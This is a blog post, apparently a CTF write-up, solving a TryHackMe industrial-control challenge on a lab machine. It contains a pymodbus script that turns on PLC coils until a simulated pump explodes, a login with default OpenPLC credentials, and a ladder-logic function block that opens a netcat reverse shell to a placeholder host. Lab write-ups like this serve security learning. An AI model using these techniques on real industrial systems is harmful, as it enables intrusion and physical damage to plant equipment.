@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="it">
+    <head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	
+	
+		<script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [["$", "$"]], 
+    },
+  };
+</script>
+
+	  
+
+	<title>Kaboom: TryHackMe - Industrial Intrusion - Task 8 &middot; Stealth Guy Blog</title>
+
+	
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/fonts.css">
+	
+	<link rel="icon" href="/favicon.ico"/>
+	<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+	
+	<link href="" rel="alternate" type="application/rss+xml" title="Stealth Guy Blog" />
+
+	<script src="/js/darkmode.js"></script>
+</head>
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					
+						<h2 class="nav-title">Stealth Guy Blog</h2>
+					
+				</a>
+				<ul>
+    
+    
+        <li>
+            <a href="/about/">
+                
+                <span>About</span>
+                
+            </a>
+        </li>
+    
+        <li>
+            <a href="/tags/">
+                
+                <span>Tags</span>
+                
+            </a>
+        </li>
+    
+</ul>
+			</div>
+		</nav>
+
+        <div id="darkModeToggle" onclick="toggleDarkMode()">
+  
+  💡
+</div>
+
+        
+
+<main>
+	
+
+
+        <div class="post">
+		<div class="post-emoji">
+    <h1>💥</h1>
+</div>
+		<h1 class="post-title">Kaboom: TryHackMe - Industrial Intrusion - Task 8</h1>
+<div class="post-line"></div>
+
+		
+<figure>
+    
+
+    
+    
+    
+        
+    
+
+     
+     
+
+    
+        <img src="/kaboomTHM/images/cover.png"
+             alt="Description of image 1"
+             width="100%"
+             height="auto"
+             loading="lazy">
+    
+
+    
+
+    
+</figure>
+
+<h2 id="writeup">Writeup</h2>
+<p>TL;DR: Crafting malicious Modbus packets and gaining a reverse shell by uploading a malicious PLC program.</p>
+<pre tabindex="0"><code>This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.
+</code></pre><h3 id="part-1---modbus">Part 1 - Modbus</h3>
+<p>The first part consists of causing an explosion in the facility&rsquo;s pumping system.
+We begin with reconnaissance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -v -n -Pn -oG fullscan 10.10.23.8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>102/tcp   open  iso-tsap
+</span></span><span style="display:flex;"><span>502/tcp   open  mbap
+</span></span><span style="display:flex;"><span>1880/tcp  open  vsat-control
+</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy
+</span></span><span style="display:flex;"><span>44818/tcp open  EtherNetIP-2
+</span></span></code></pre></div><p>The first thing I did was visit the website on port <code>80</code>. There was a video of a working pump. This webpage was populated using a script in the HTML that fetches data from <code>/api/state</code>.</p>
+
+<figure>
+    
+
+    
+    
+    
+        
+    
+
+     
+     
+
+    
+        <img src="/kaboomTHM/images/pump.png"
+             alt="Description of image 1"
+             width="60%"
+             height="auto"
+             loading="lazy">
+    
+
+    
+
+    
+</figure>
+
+<p>Next, I visited port <code>8080</code> and found an OpenPLC v3 login page. From previous experience with OpenPLC, I knew the default credentials are <code>openplc:openplc</code>, so I tried them—and they worked.</p>
+<p>Then I checked out port <code>1880</code>, which showed a Node-RED login page. However, I couldn&rsquo;t access it.</p>
+<p>I then turned my attention to ports <code>502</code>, <code>102</code>, and <code>44818</code>, which are commonly used in the OT (Operational Technology) domain—specifically, Modbus TCP, Siemens S7 (proprietary), and Ethernet/IP (Rockwell), respectively.</p>
+<p>OpenPLC typically communicates via Modbus TCP because it&rsquo;s open and widely supported. While OpenPLC does support S7 and Ethernet/IP through additional libraries, Modbus is the easiest to interact with. So, I began inspecting the Modbus interface.</p>
+<p>Modbus primarily uses the concept of &ldquo;coils.&rdquo; Coils are boolean variables (ON/OFF). To explode the pump, I had the idea to turn all the coils ON.</p>
+<p>To do this, I connected to the PLC on port <code>502</code> using a Python library called <code>pymodbus</code>, which enables Modbus communication:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install pymodbus
+</span></span></code></pre></div><p>The script I wrote:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> <span style="color:#111">pymodbus.client</span> <span style="color:#f92672">import</span> <span style="color:#111">ModbusTcpClient</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#111">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#111">time</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># IP of the PLC</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">PLC_IP</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;10.10.180.166&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Modbus TCP port (default: 502)</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">MODBUS_PORT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">502</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connect to the PLC over Modbus TCP</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">client</span> <span style="color:#f92672">=</span> <span style="color:#111">ModbusTcpClient</span><span style="color:#111">(</span><span style="color:#111">PLC_IP</span><span style="color:#111">,</span> <span style="color:#111">port</span><span style="color:#f92672">=</span><span style="color:#111">MODBUS_PORT</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">connection</span> <span style="color:#f92672">=</span> <span style="color:#111">client</span><span style="color:#f92672">.</span><span style="color:#111">connect</span><span style="color:#111">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">if</span> <span style="color:#111">connection</span><span style="color:#111">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Connected to PLC on Modbus TCP.&#34;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">coil</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">while</span> <span style="color:#00a8c8">True</span><span style="color:#111">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">f</span><span style="color:#d88200">&#34;Attempting to open the gate by writing to coil at address </span><span style="color:#d88200">{</span><span style="color:#111">coil</span><span style="color:#d88200">}</span><span style="color:#d88200">...&#34;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">result</span> <span style="color:#f92672">=</span> <span style="color:#111">client</span><span style="color:#f92672">.</span><span style="color:#111">write_coil</span><span style="color:#111">(</span><span style="color:#111">coil</span><span style="color:#111">,</span> <span style="color:#00a8c8">True</span><span style="color:#111">)</span>  <span style="color:#75715e"># True means ON (1)</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00a8c8">if</span> <span style="color:#111">result</span><span style="color:#111">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">f</span><span style="color:#d88200">&#34;Successfully opened the gate at address </span><span style="color:#d88200">{</span><span style="color:#111">coil</span><span style="color:#d88200">}</span><span style="color:#d88200">.&#34;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00a8c8">else</span><span style="color:#111">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">f</span><span style="color:#d88200">&#34;Failed to write to coil at address </span><span style="color:#d88200">{</span><span style="color:#111">coil</span><span style="color:#d88200">}</span><span style="color:#d88200">.&#34;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Optional: Wait for the gate to open, adjust the time as needed (e.g., 2 seconds)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">time</span><span style="color:#f92672">.</span><span style="color:#111">sleep</span><span style="color:#111">(</span><span style="color:#ae81ff">2</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Verify the status of the coil after writing (check if it&#39;s ON)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">status</span> <span style="color:#f92672">=</span> <span style="color:#111">client</span><span style="color:#f92672">.</span><span style="color:#111">read_coils</span><span style="color:#111">(</span><span style="color:#111">coil</span><span style="color:#111">,</span> <span style="color:#111">count</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#111">)</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#111">requests</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span><span style="color:#d88200">f</span><span style="color:#d88200">&#34;http://</span><span style="color:#d88200">{</span><span style="color:#111">PLC_IP</span><span style="color:#d88200">}</span><span style="color:#d88200">/api/state&#34;</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">text</span><span style="color:#111">)</span>  <span style="color:#75715e"># fetch the api to see if the pump exploded</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">f</span><span style="color:#d88200">&#34;Coil at address </span><span style="color:#d88200">{</span><span style="color:#111">coil</span><span style="color:#d88200">}</span><span style="color:#d88200"> status: </span><span style="color:#d88200">{</span><span style="color:#111">status</span><span style="color:#f92672">.</span><span style="color:#111">bits</span><span style="color:#111">[</span><span style="color:#ae81ff">0</span><span style="color:#111">]</span><span style="color:#d88200">}</span><span style="color:#d88200">&#34;</span><span style="color:#111">)</span>  <span style="color:#75715e"># 1 means ON, 0 means OFF</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#111">coil</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span> 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">else</span><span style="color:#111">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">print</span><span style="color:#111">(</span><span style="color:#d88200">&#34;Failed to connect to PLC on Modbus TCP.&#34;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Close the connection</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">client</span><span style="color:#f92672">.</span><span style="color:#111">close</span><span style="color:#111">()</span>
+</span></span></code></pre></div><p>Note: I used <code>requests</code> to poll the <code>/api/state</code> endpoint to see if the pump&rsquo;s state changed.</p>
+<p>Script output:</p>
+<pre tabindex="0"><code>Coil at address 8 status: True
+Attempting to open the gate by writing to coil at address 9...
+Successfully opened the gate at address 9.
+{
+  &#34;status&#34;: &#34;Cooling OFF, Low Temperature&#34;,
+  &#34;video&#34;: &#34;normal&#34;
+}
+
+Coil at address 9 status: True
+Attempting to open the gate by writing to coil at address 10...
+Successfully opened the gate at address 10.
+{
+  &#34;status&#34;: &#34;Explosion Detected!&#34;,
+  &#34;video&#34;: &#34;explodedflag23&#34;
+}
+</code></pre><p>After reloading <code>MACHINE_IP:80</code>, the first flag appeared in the video.
+
+<figure>
+    
+
+    
+    
+    
+        
+    
+
+     
+     
+
+    
+        <img src="/kaboomTHM/images/flag1.png"
+             alt="Description of image 1"
+             width="100%"
+             height="auto"
+             loading="lazy">
+    
+
+    
+
+    
+</figure>
+</p>
+<h3 id="part-2---reverse-shell">Part 2 - Reverse Shell</h3>
+<p>Now we’re asked for another flag, referred to as the <strong>Ubuntu flag</strong>. Here&rsquo;s where things get interesting.</p>
+<p>OpenPLC is a <em>soft PLC</em>, meaning it runs as software on a general-purpose machine (often Ubuntu) rather than as dedicated hardware. Soft PLCs are typically used for learning and simulation because they lack the real-time guarantees required in industrial environments.</p>
+<p>OpenPLC consists of two parts: the <strong>Runtime</strong> and the <strong>Editor</strong>. On port <code>8080</code>, we saw the OpenPLC <strong>Runtime</strong> login interface (which accepted default credentials), so it&rsquo;s reasonable to assume OpenPLC is running on an Ubuntu machine.</p>
+<p>But how do we access the underlying file system via the OpenPLC dashboard?</p>
+<p>The OpenPLC dashboard allows enabling/disabling protocols and, more importantly, uploading PLC programs. Which of these features could be exploited?</p>
+<p>At first, I managed to trigger a Flask error using the &ldquo;Run&rdquo; button in the dashboard. Since Flask was running with <code>debug_mode=True</code>, I explored command injection opportunities—but found none.</p>
+<p>I searched for known RCE vulnerabilities in OpenPLC Runtime, but came up empty. Then I focused on the program upload feature and realized this might not be a typical web challenge—it’s about <strong>getting a reverse shell</strong> via PLC programming.</p>
+<p>As mentioned earlier, OpenPLC supports the IEC 61131 standard, which defines industrial programming languages like Ladder Diagram (LD), Structured Text (ST), etc. What if we could embed a reverse shell into the PLC program?</p>
+<p><strong>Can you write a reverse shell in Ladder Logic?</strong></p>
+<p>Yes! Thanks to this excellent article: <a href="https://www.pentestpartners.com/security-blog/snakes-and-ladder-logic/">Snakes and Ladder Logic</a></p>
+<p>In short: you can create a <strong>custom Function Block</strong> that executes a reverse shell, and call it from your PLC program—a real backdoor.</p>
+<p>In the article example, the shell is triggered when a button is pressed. In our case, since nothing is wired to our Soft PLC, we trigger it automatically.</p>
+<p>I remembered that installing the OpenPLC Editor on Linux was pretty messy, and since I was in a hurry, I asked my friend Davide (thanks Davide!) to install it on his Windows PC. Then we completed the challenge together.</p>
+<p>We created a new Ladder Diagram project, wrote a custom Function Block, and embedded it in the main program.</p>
+<p>Payload screenshots:</p>
+
+<figure>
+    
+
+    
+    
+    
+        
+    
+
+     
+     
+
+    
+        <img src="/kaboomTHM/images/function_block.webp"
+             alt="Description of image 1"
+             width="100%"
+             height="auto"
+             loading="lazy">
+    
+
+    
+
+    
+</figure>
+
+
+<figure>
+    
+
+    
+    
+    
+        
+    
+
+     
+     
+
+    
+        <img src="/kaboomTHM/images/program_LD.webp"
+             alt="Description of image 1"
+             width="100%"
+             height="auto"
+             loading="lazy">
+    
+
+    
+
+    
+</figure>
+
+<p>Since nothing is wired to this PLC, our ladder logic simply consists of the Function Block placed between the power rails—it runs unconditionally.</p>
+<p>The code we used (adapted from the article) was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>IF <span style="color:#f92672">(</span><span style="color:#111">exe</span> <span style="color:#f92672">=</span> TRUE<span style="color:#f92672">)</span> THEN
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;mknod /tmp/pipe p&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;/bin/sh 0&lt;/tmp/pipe | nc &lt;IP_ADDRESS&gt; &lt;PORT&gt; 1&gt;/tmp/pipe&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">done</span> :<span style="color:#f92672">=</span> TRUE<span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#00a8c8">return</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>END_IF<span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">done</span> :<span style="color:#f92672">=</span> FALSE<span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">return</span><span style="color:#111">;</span>
+</span></span></code></pre></div><p>After compiling it to a <code>.st</code> file (using the orange arrow button in the toolbar), we uploaded <code>rev_shell.st</code> via the OpenPLC Runtime dashboard.</p>
+
+
+
+
+
+
+<div class="notice warning">
+    <div class="icon">
+        
+        
+        <span class="n-emoji">⚠️</span>
+        
+    </div>
+    <div class="content">
+        Don’t forget to start your <strong>listener!</strong>
+    </div>
+</div>
+
+<style>
+    .notice {
+        display: flex;
+        padding: 10px;
+        margin-bottom: 20px;
+        border-radius: 4px;
+    }
+
+    .notice .icon {
+        display: flex;
+        align-items: center;
+    }
+
+    .notice .n-emoji {
+        display: flex;
+        align-items: center;
+    }
+
+
+    .notice .content {
+        margin-left: 0.5rem;
+    }
+
+    .success {
+        background-color: #edf3ec;
+        color: #458361;
+        border: 1px solid #edf3ec;
+    }
+
+    .info {
+        background-color: #e7f3f9;
+        color: #347ea9;
+        border: 1px solid #e7f3f9;
+    }
+    .callout {
+        background-color: #f1f1ef;
+        color: #37352f;
+        border: 1px solid #f1f1ef;
+    }
+
+    .warning {
+        background-color: #fbf3dc;
+        color: #cb9230;
+        border: 1px solid #fbf3dc;
+    }
+
+    .error {
+        background-color: #fdebec;
+        color: #d44c47;
+        border: 1px solid #fdebec;
+    }
+</style>
+
+<p>Finally, we clicked the &ldquo;RUN PLC&rdquo; button—and we had a reverse shell.</p>
+
+<figure>
+    
+
+    
+    
+    
+        
+    
+
+     
+     
+
+    
+        <img src="/kaboomTHM/images/reverse_runtime.png"
+             alt="Description of image 1"
+             width="100%"
+             height="auto"
+             loading="lazy">
+    
+
+    
+
+    
+</figure>
+
+<p>We can now navigate the Ubuntu filesystem and retrieve the flag located at <code>/home/ubuntu/flag.txt</code>.</p>
+
+<figure>
+    
+
+    
+    
+    
+        
+    
+
+     
+     
+
+    
+        <img src="/kaboomTHM/images/ubuntu_shell.png"
+             alt="Description of image 1"
+             width="100%"
+             height="auto"
+             loading="lazy">
+    
+
+    
+
+    
+</figure>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>I found this challenge extremely interesting because I really like to experiment with resolving &ldquo;strange&rdquo; challenges that differ from the usual categories. I&rsquo;ve always been curious aubout OT (Operational Technology), which differs from IT technologies but shares some common security flaws. In future CTFs, I would like to dive deeper into OT technologies and better understand the differences and connections between IT security and OT security, while continuing to learn and apply my skills about this topic.&quot;</p>
+
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/about/" class="left arrow">&#8592;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			
+		</footer>
+
+    </body>
+</html>
